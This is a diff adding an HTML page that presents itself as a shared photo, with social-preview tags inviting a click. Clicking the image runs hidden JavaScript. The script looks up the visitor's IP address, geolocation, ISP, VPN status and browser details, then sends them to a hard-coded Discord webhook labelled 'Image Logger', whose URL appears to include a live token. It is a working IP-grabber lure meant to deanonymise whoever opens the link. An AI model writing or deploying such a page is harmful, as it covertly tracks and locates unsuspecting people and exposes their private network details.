@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Maroc Photo</title>
+  <meta property="og:title" content="Check this out!">
+  <meta property="og:description" content="Click to view the image.">
+  <meta property="og:image" content="https://anas-com.github.io/discord-loger/photo.jpg"> <!-- Replace with your GitHub Pages link -->
+  <meta property="og:url" content="https://your-github-pages-link"> <!-- Replace with your GitHub Pages link -->
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #000;
+    }
+    img {
+      max-width: 100%;
+      max-height: 100%;
+      cursor: pointer;
+    }
+    .message {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: white;
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <img src="photo.jpg" alt="Image" onclick="logInfo()">
+  <div class="message" id="message">
+    Clicking
+  </div>
+
+  <script>
+    async function logInfo() {
+      try {
+        // Fetch the user's IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        // Get additional information using IP-API
+        const infoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
+        const infoData = await infoResponse.json();
+
+        // Extract relevant information
+        const country = infoData.country || 'Unknown';
+        const region = infoData.regionName || 'Unknown';
+        const city = infoData.city || 'Unknown';
+        const timezone = infoData.timezone || 'Unknown';
+        const isp = infoData.isp || 'Unknown';
+        const as = infoData.as || 'Unknown';
+        const mobile = infoData.mobile ? 'Yes' : 'No';
+        const proxy = infoData.proxy ? 'Yes' : 'No';
+
+        // Get the user agent and other browser information
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+        // Prepare the data to send to Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1334926552739086376/JGGI5sZsZqEOplR03c4_odbTkw1hByXykBul_NJ--Qj3OGA1GXO3fSuiZLajZICgHqAx'; // Replace with your Discord webhook URL
+        const embed = {
+          username: 'Image Logger',
+          embeds: [
+            {
+              title: 'New IP Logged',
+              color: 0x00ff00,
+              fields: [
+                { name: 'IP Address', value: ip },
+                { name: 'Country', value: country },
+                { name: 'Region', value: region },
+                { name: 'City', value: city },
+                { name: 'Timezone', value: timezone },
+                { name: 'ISP', value: isp },
+                { name: 'AS', value: as },
+                { name: 'Mobile', value: mobile },
+                { name: 'Proxy/VPN', value: proxy },
+                { name: 'User Agent', value: userAgent },
+                { name: 'Platform', value: platform },
+                { name: 'Language', value: language },
+                { name: 'Screen Resolution', value: screenResolution },
+              ],
+              timestamp: new Date().toISOString(),
+            },
+          ],
+        };
+
+        // Send the data to Discord
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(embed),
+        });
+
+        // Show a confirmation message
+        document.getElementById('message').textContent = 'maroc.';
+      } catch (error) {
+        console.error('Error logging information:', error);
+        document.getElementById('message').textContent = 'Failed to show Photo.';
+      }
+    }
+  </script>
+</body>
+</html>
